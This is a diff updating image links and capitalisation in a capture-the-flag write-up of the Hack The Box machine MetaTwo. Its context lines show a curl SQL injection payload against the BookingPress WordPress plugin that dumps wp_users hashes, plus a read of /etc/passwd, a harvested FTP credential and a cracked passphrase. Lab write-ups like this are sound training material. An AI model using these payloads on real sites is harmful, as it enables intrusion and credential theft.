@@ -6,7 +6,7 @@
 
 ------------------------------------------------
 
-MetaTwo.png
+![MetaTwo.png](../assets/metatwo_assets/MetaTwo.png)
 
 #### Enumeration
 
@@ -40,7 +40,7 @@ Let's add metapress.htb to `/etc/hosts`.
 
 Looking at he site we find a simple page:
 
-htb_metatwo_site.png
+![htb_metatwo_site.png](../assets/metatwo_assets/htb_metatwo_site.png)
 
 Scrolling to the bottom of the page (or just looking at the page source) we find the site is running WordPress.
 
@@ -53,11 +53,11 @@ Running wpscan with:
 
 We locate two users, admin and manager:
 
-htb_metatwo_manager.png
+![htb_metatwo_manager.png](../assets/metatwo_assets/htb_metatwo_manager.png)
 
 Looking at the page source of http://metapress.htb/events/ we see that the plugin bookingpress is being used:
 
-htb_metatwo_plugin.png
+![htb_metatwo_plugin.png](../assets/metatwo_assets/htb_metatwo_plugin.png)
 
 Looking for exploits I find: https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/
 
@@ -80,11 +80,11 @@ Time based payload:  curl -i 'https://example.com/wp-admin/admin-ajax.php' \
 
 Because there is already an event we can skip the first two steps, and simply inspect the page source of `/events` for the wpnonce we'll need:
 
-htb_metatwo_nonce.png
+![htb_metatwo_nonce.png](../assets/metatwo_assets/htb_metatwo_nonce.png)
 
 We can then follow the POC and view the version number:
 
-htb_metatwo_version.png
+![htb_metatwo_version.png](../assets/metatwo_assets/htb_metatwo_version.png)
 
 Cool, let's now access the known wp_users table for WP dbs:
 
@@ -94,7 +94,7 @@ Cool, let's now access the known wp_users table for WP dbs:
   --data 'action=bookingpress_front_get_category_services&_wpnonce=398e4fd1fc&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -'
 ```
 
-htb_metatwo_hashes.png
+![htb_metatwo_hashes.png](../assets/metatwo_assets/htb_metatwo_hashes.png)
 
 Cool, let's add these password hashes to a file and try cracking them with john:
 
@@ -171,15 +171,15 @@ proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
 ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
 ```
 
-After struggling to find anything of interest (SSH keys, wp-config.php, etc.) using this vulnerability, i decided to check the webroot being used at `/etc/nginx/sites-enabled/default`
+After struggling to find anything of interest (SSH keys, wp-config.php, etc.) using this vulnerability, I decided to check the webroot being used at `/etc/nginx/sites-enabled/default`
 
-htb_matatwo_path.png
+![htb_matatwo_path.png](../assets/metatwo_assets/htb_metatwo_path.png)
 
 And that explains why I had been unable to access any interesting wordpress files, the blog isn't located at the normal path of `/var/www/html` or `/var/www/html/wordpress`, etc.
 
 We can now access the wp-config file at: `/var/www/metapress.htb/blog/wp-config.php` which gives us a few credentials:
 
-htb_metatwo_creds.png
+![htb_metatwo_creds.png](../assets/metatwo_assets/htb_metatwo_creds.png)
 
 For FTP: `metapress.htb:9NYS_ii@FyL_p5M2NvJ`
 
@@ -254,11 +254,11 @@ $mail->Port = 587;
 
 Which we can use to SSH in with and grab the first flag:
 
-htb_metatwo_user.png
+![htb_metatwo_user.png](../assets/metatwo_assets/htb_metatwo_user.png)
 
 ### Privilege Escalation
 
-in jnelson's home directory there is a passpie folder:
+In jnelson's home directory there is a passpie folder:
 
 ```
 jnelson@meta2:~/.passpie$ ls -la
@@ -283,7 +283,7 @@ File key
 
 John quickly cracks the passphrase:
 
-htb_metatwo_john.png
+![htb_metatwo_john.png](../assets/metatwo_assets/htb_metatwo_john.png)
 
 `blink182`
 
@@ -307,7 +307,7 @@ root
 
 And grab the final flag:
 
-htb_metatwo_root.png
+![htb_metatwo_root.png](../assets/metatwo_assets/htb_metatwo_root.png)
 
 Thanks for following along!
 
